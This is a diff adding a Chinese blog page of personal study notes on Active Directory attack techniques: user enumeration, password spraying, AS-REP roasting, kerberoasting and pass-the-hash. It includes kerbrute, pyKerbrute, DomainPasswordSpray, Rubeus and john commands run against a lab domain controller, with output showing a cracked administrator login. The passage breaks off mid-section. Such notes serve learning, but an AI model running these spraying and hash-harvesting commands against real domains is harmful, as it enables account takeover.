@@ -1,0 +1,984 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  域渗透-攻击手段 | L
+</title>
+<meta name="description" content="少女祈祷中..."/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"English\",\"Locale\":\"\"},{\"Lang\":\"ja\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"日本語\",\"Locale\":\"\"},{\"Lang\":\"zh-cn\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"简体中文\",\"Locale\":\"zh-cn\"},{\"Lang\":\"zh-tw\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"繁體中文\",\"Locale\":\"\"}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" /><meta property="og:type" content="website" />
+  <meta property="og:title" content="域渗透-攻击手段 | L" />
+  <meta
+    property="og:description"
+    content="少女祈祷中..."
+  />
+  <meta property="og:url" content="http://localhost:1313/post/ad%E5%9F%9F/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5/" />
+  <meta
+    property="og:site_name"
+    content="HELLO WORLD"
+  />
+  <meta property="og:image" content="http://localhost:1313/images/banner.webp" />
+  <meta property="article:author" content="L" />
+  <meta property="article:published_time" content="0001-01-01T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="0001-01-01T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="http://localhost:1313/images/banner.webp" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" aria-selected="false" >English</li><li data-value="ja" role="option" aria-selected="false" >日本語</li><li data-value="zh-cn" role="option" class="selected" aria-selected="true" >简体中文</li><li data-value="zh-tw" role="option" aria-selected="false" >繁體中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="域渗透-攻击手段"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">域渗透-攻击手段</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          
+          class="sidebar-right"  ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01--域内用户枚举">0x01  域内用户枚举</a>
+      <ul>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#工具">工具</a></li>
+        <li><a href="#总结">总结</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-密码喷洒">0x02 密码喷洒</a>
+      <ul>
+        <li><a href="#原理-1">原理</a></li>
+        <li><a href="#工具-1">工具</a></li>
+        <li><a href="#总结-1">总结</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-as-rep-roasting">0x03 AS-REP Roasting</a>
+      <ul>
+        <li><a href="#原理-2">原理</a></li>
+        <li><a href="#前提">前提</a></li>
+        <li><a href="#实施">实施</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x04-kerberoasting">0x04 kerberoasting</a>
+      <ul>
+        <li><a href="#原理-3">原理</a></li>
+        <li><a href="#前提-1">前提</a></li>
+        <li><a href="#攻击流程">攻击流程</a></li>
+        <li><a href="#实施-见书234页懒得写">实施 (见书234页，懒得写)</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x05-哈希传递pth">0x05 哈希传递(PTH)</a>
+      <ul>
+        <li><a href="#原理-4">原理</a></li>
+        <li><a href="#局限">局限</a></li>
+        <li><a href="#实施-1">实施</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x06-票据传递攻击">0x06 票据传递攻击</a>
+      <ul>
+        <li><a href="#一黄金票据传递攻击">一、黄金票据传递攻击</a></li>
+        <li><a href="#二白银票据传递攻击">二、白银票据传递攻击</a></li>
+        <li><a href="#三黄金和白银票据的区别">三、黄金和白银票据的区别</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x07-委派攻击">0x07 委派攻击</a>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">74</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      15
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">20</div>
+  </a>
+</div>
+<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">友链</div>
+    </div></div></div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="0001-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >0001-01-01</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >0001-01-01</time
+    >
+  </span></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="0x01--域内用户枚举">
+<a class="header-anchor" href="#0x01--%e5%9f%9f%e5%86%85%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be"></a>
+0x01  域内用户枚举
+</h2><h3 id="原理">
+<a class="header-anchor" href="#%e5%8e%9f%e7%90%86"></a>
+原理
+</h3><p>根据kerberos协议中的AS-REQ阶段，不同用户状态（禁用、启用、不存在）时的不同响应实现枚举。</p>
+<h3 id="工具">
+<a class="header-anchor" href="#%e5%b7%a5%e5%85%b7"></a>
+工具
+</h3><ul>
+<li>
+<p>kerbrute</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">地址：https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">使用：
+</span></span><span class="line"><span class="cl"> .<span class="se">\k</span>erbrute_windows_amd64.exe userenum --dc 192.168.1.200 -d xie.com user.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="c1">## user.txt 是字典，需要自己指定.</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">## --dc 指域控的IP </span>
+</span></span><span class="line"><span class="cl"> <span class="c1">## xie.com 指域名</span>
+</span></span></code></pre></div></li>
+<li>
+<p>pykerbrute</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">可使用TCP和UDP两种模式枚举，没有用过......
+</span></span></code></pre></div></li>
+<li>
+<p>msf中kerberos_enumusers 模块</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">没用过......
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="总结">
+<a class="header-anchor" href="#%e6%80%bb%e7%bb%93"></a>
+总结
+</h3><ul>
+<li>
+<p>依托字典</p>
+</li>
+<li>
+<p>枚举产生过高流量，易被发现</p>
+</li>
+<li>
+<p>无需在域环境也能实施。</p>
+</li>
+</ul>
+<h2 id="0x02-密码喷洒">
+<a class="header-anchor" href="#0x02-%e5%af%86%e7%a0%81%e5%96%b7%e6%b4%92"></a>
+0x02 密码喷洒
+</h2><h3 id="原理-1">
+<a class="header-anchor" href="#%e5%8e%9f%e7%90%86-1"></a>
+原理
+</h3><p>密码爆破：单个或几个用户，极多密码。</p>
+<p>密码喷洒：单个或几个密码，极多用户。</p>
+<p>因为域内通常会存在账户锁定策略，所以尽量避免密码爆破攻击。</p>
+<h3 id="工具-1">
+<a class="header-anchor" href="#%e5%b7%a5%e5%85%b7-1"></a>
+工具
+</h3><ul>
+<li>kerbrute(还是上面那个)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="mf">77629</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">kerbrute_windows_amd64</span><span class="p">.</span><span class="py">exe</span> <span class="n">passwordspray</span> <span class="p">-</span><span class="n">-dc</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">200</span> <span class="n">-d</span> <span class="n">xie</span><span class="p">.</span><span class="py">com</span> <span class="n">user</span><span class="p">.</span><span class="py">txt</span> <span class="n">123456Liu</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">__</span>             <span class="n">__</span>               <span class="n">__</span>
+</span></span><span class="line"><span class="cl">   <span class="p">/</span> <span class="p">/</span><span class="n">_____</span>  <span class="n">_____</span><span class="p">/</span> <span class="p">/</span><span class="n">_</span>  <span class="n">_______</span>  <span class="n">__</span><span class="p">/</span> <span class="p">/</span><span class="n">____</span>
+</span></span><span class="line"><span class="cl">  <span class="p">/</span> <span class="p">//</span><span class="n">_</span><span class="p">/</span> <span class="n">_</span> <span class="p">\/</span> <span class="n">___</span><span class="p">/</span> <span class="n">__</span> <span class="p">\/</span> <span class="n">___</span><span class="p">/</span> <span class="p">/</span> <span class="p">/</span> <span class="p">/</span> <span class="n">__</span><span class="p">/</span> <span class="n">_</span> <span class="p">\</span>
+</span></span><span class="line"><span class="cl"> <span class="p">/</span> <span class="p">,&lt;</span> <span class="p">/</span>  <span class="n">__</span><span class="p">/</span> <span class="p">/</span>  <span class="p">/</span> <span class="p">/</span><span class="n">_</span><span class="p">/</span> <span class="p">/</span> <span class="p">/</span>  <span class="p">/</span> <span class="p">/</span><span class="n">_</span><span class="p">/</span> <span class="p">/</span> <span class="p">/</span><span class="n">_</span><span class="p">/</span>  <span class="n">__</span><span class="p">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">_</span><span class="p">/|</span><span class="n">_</span><span class="p">|\</span><span class="n">___</span><span class="p">/</span><span class="n">_</span><span class="p">/</span>  <span class="p">/</span><span class="n">_</span><span class="p">.</span><span class="n">___</span><span class="p">/</span><span class="n">_</span><span class="p">/</span>   <span class="p">\</span><span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="p">/\</span><span class="n">__</span><span class="p">/\</span><span class="n">___</span><span class="p">/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Version</span><span class="err">:</span> <span class="n">v1</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">3</span> <span class="p">(</span><span class="n">9dad6e1</span><span class="p">)</span> <span class="p">-</span> <span class="mf">02</span><span class="p">/</span><span class="mf">05</span><span class="p">/</span><span class="mf">24</span> <span class="p">-</span> <span class="n">Ronnie</span> <span class="n">Flathers</span> <span class="nv">@ropnop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">2024</span><span class="p">/</span><span class="mf">02</span><span class="p">/</span><span class="mf">05</span> <span class="mf">19</span><span class="err">:</span><span class="mf">59</span><span class="err">:</span><span class="mf">14</span> <span class="p">&gt;</span>  <span class="n">Using</span> <span class="n">KDC</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2024</span><span class="p">/</span><span class="mf">02</span><span class="p">/</span><span class="mf">05</span> <span class="mf">19</span><span class="err">:</span><span class="mf">59</span><span class="err">:</span><span class="mf">14</span> <span class="p">&gt;</span>   <span class="mf">192.168</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="mf">200</span><span class="err">:</span><span class="mf">88</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2024</span><span class="p">/</span><span class="mf">02</span><span class="p">/</span><span class="mf">05</span> <span class="mf">19</span><span class="err">:</span><span class="mf">59</span><span class="err">:</span><span class="mf">14</span> <span class="p">&gt;</span>  <span class="p">[+]</span> <span class="n">VALID</span> <span class="n">LOGIN</span><span class="err">:</span>  <span class="n">administrator</span><span class="nv">@xie</span><span class="p">.</span><span class="n">com</span><span class="err">:</span><span class="n">123456Liu</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2024</span><span class="p">/</span><span class="mf">02</span><span class="p">/</span><span class="mf">05</span> <span class="mf">19</span><span class="err">:</span><span class="mf">59</span><span class="err">:</span><span class="mf">14</span> <span class="p">&gt;</span>  <span class="n">Done</span><span class="p">!</span> <span class="n">Tested</span> <span class="mf">6</span> <span class="n">logins</span> <span class="p">(</span><span class="mf">1</span> <span class="n">successes</span><span class="p">)</span> <span class="k">in</span> <span class="mf">0.007</span> <span class="n">seconds</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">### 注意选择 passwordspray 表示 启用密码喷洒模式。</span>
+</span></span></code></pre></div><ul>
+<li>pykerbrute （可以使用hash进行喷洒）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">该工具可使用ntml-hash 实现密码喷洒
+</span></span><span class="line"><span class="cl">地址：https://github.com/3gstudent/pyKerbrute.git
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">例如：
+</span></span><span class="line"><span class="cl">ADPwdSpray.py 192.168.1.1 test.com user.txt clearpassword DomainUser123! tcp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ADPwdSpray.py 192.168.1.1 test.com user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp
+</span></span></code></pre></div><ul>
+<li>
+<p>domainpasswordspray</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## 该工具提供了另一种形式的密码喷洒。
+</span></span><span class="line"><span class="cl">## 原理是使用ldap自动获取账户，然后进行密码喷洒，因此只需要指定密码参数即可。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Import-Module DomainPasswordSpray.ps1 //导入模块
+</span></span><span class="line"><span class="cl">Invoke-DomainPasswordSpray -Password Spring2017 //使用
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">注意：
+</span></span><span class="line"><span class="cl">1.只能在域内机器中使用。
+</span></span><span class="line"><span class="cl">2.本身是ps脚本。
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="总结-1">
+<a class="header-anchor" href="#%e6%80%bb%e7%bb%93-1"></a>
+总结
+</h3><ul>
+<li>枚举产生过高流量，易被发现</li>
+<li>可以说是用户枚举的扩充。</li>
+</ul>
+<h2 id="0x03-as-rep-roasting">
+<a class="header-anchor" href="#0x03-as-rep-roasting"></a>
+0x03 AS-REP Roasting
+</h2><h3 id="原理-2">
+<a class="header-anchor" href="#%e5%8e%9f%e7%90%86-2"></a>
+原理
+</h3><p>产生于AS-REP阶段。</p>
+<p>指定用户向域控的88端口请求票据，域控不会进行认证就返回AS-REP中的TGT和该用户hash加密的login_session_key。</p>
+<p>获取后，对 该用户hash加密的login_session_key 进行离线暴力破解。获取用户hash，甚至明文密码。</p>
+<h3 id="前提">
+<a class="header-anchor" href="#%e5%89%8d%e6%8f%90"></a>
+前提
+</h3><ul>
+<li>需要关闭kerberos预身份验证。默认是<strong>开启</strong>的。作用是记录登陆失败次数，进行锁定，防止爆破。</li>
+</ul>
+<p><img src="./../../images/image-20240205205332103.png" alt="image-20240205205332103"></p>
+<p>如上图所示，为关闭的情况。</p>
+<h3 id="实施">
+<a class="header-anchor" href="#%e5%ae%9e%e6%96%bd"></a>
+实施
+</h3><p><strong>步骤</strong></p>
+<p>1.获取hash。分为域内情况和域外情况。</p>
+<p>2.离线爆破</p>
+<h4 id="域内情况下">
+<a class="header-anchor" href="#%e5%9f%9f%e5%86%85%e6%83%85%e5%86%b5%e4%b8%8b"></a>
+域内情况下
+</h4><ul>
+<li>rubeus工具</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">GitHub上面不开放exe版本下载，需要自己去生成，我们先去GitHub下面下载：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">https://github.com/GhostPack/Rubeus
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">解压后使用vs打开Rubeus.sln文件，点击生成-&gt;生成Rubeus即可，之后exe文件会生成在Rubeus\bin\Debug目录下。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">用法：
+</span></span><span class="line"><span class="cl">rubeus.exe asreproast /format:john /outfile:hash.txt  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">该工具，自动搜集域内关闭与身份验证的用户,然后获取hash，并存为john能破解的文件格式。
+</span></span></code></pre></div><ul>
+<li>asrep roast .ps1脚本</li>
+</ul>
+<p>原理与上面一致，没用过。。。</p>
+<h4 id="域外的情况下">
+<a class="header-anchor" href="#%e5%9f%9f%e5%a4%96%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b"></a>
+域外的情况下
+</h4><p>先使用adfind查询 关闭域身份验证的用户 。然后使用impacket下的getnpusers.py获取hash</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">暂时没写
+</span></span></code></pre></div><h4 id="爆破">
+<a class="header-anchor" href="#%e7%88%86%e7%a0%b4"></a>
+爆破
+</h4><p>john &ndash;wordlist=xxx hash.txt</p>
+<h2 id="0x04-kerberoasting">
+<a class="header-anchor" href="#0x04-kerberoasting"></a>
+0x04 kerberoasting
+</h2><h3 id="原理-3">
+<a class="header-anchor" href="#%e5%8e%9f%e7%90%86-3"></a>
+原理
+</h3><p>发生在kerberos认证的TGS_REP阶段。</p>
+<p>TGS_REP中会响应一个由服务hash加密的ST给客户端，该ST是由服务hash加密的，因此客户端拿到ST后，可以用于本地离线爆破。</p>
+<p>字典足够强大可以爆破到该服务账户的口令。</p>
+<h3 id="前提-1">
+<a class="header-anchor" href="#%e5%89%8d%e6%8f%90-1"></a>
+前提
+</h3><ul>
+<li>攻击者和KDC协商ST加密时，使用RC4_HMAC_MD5算法，该算法易破解。若强制采用其他加密算法，如AES-256，将难以爆破。</li>
+<li>以获取一个域内普通账户的凭证。需要以该用户去先获取TGT。</li>
+<li>查询到用于注册域用户的SPN。</li>
+</ul>
+<h3 id="攻击流程">
+<a class="header-anchor" href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b"></a>
+攻击流程
+</h3><ol>
+<li>攻击者先用域内的正常账户进行AS过程的认证，获取到TGT</li>
+<li>攻击者使用获取的TGT请求针对指定SPN的ST。</li>
+<li>获取到ST后，攻击者开始本地离线破解。</li>
+</ol>
+<h3 id="实施-见书234页懒得写">
+<a class="header-anchor" href="#%e5%ae%9e%e6%96%bd-%e8%a7%81%e4%b9%a6234%e9%a1%b5%e6%87%92%e5%be%97%e5%86%99"></a>
+实施 (见书234页，懒得写)
+</h3><p>1.发现SPN</p>
+<p>2.请求ST</p>
+<p>3.破解ST</p>
+<h2 id="0x05-哈希传递pth">
+<a class="header-anchor" href="#0x05-%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92pth"></a>
+0x05 哈希传递(PTH)
+</h2><h3 id="原理-4">
+<a class="header-anchor" href="#%e5%8e%9f%e7%90%86-4"></a>
+原理
+</h3><p>ntlm协议和kerberos协议都是使用ntml-hash来加密的，因此，当未能获取明文密码时，也可以使用ntlm-hash 进行哈希传递攻击。</p>
+<h3 id="局限">
+<a class="header-anchor" href="#%e5%b1%80%e9%99%90"></a>
+局限
+</h3><ul>
+<li>
+<p>win server 2012R2以后的系统中新增了protected users组的概念，对加入此组的账户无法实施PTH攻击。</p>
+</li>
+<li>
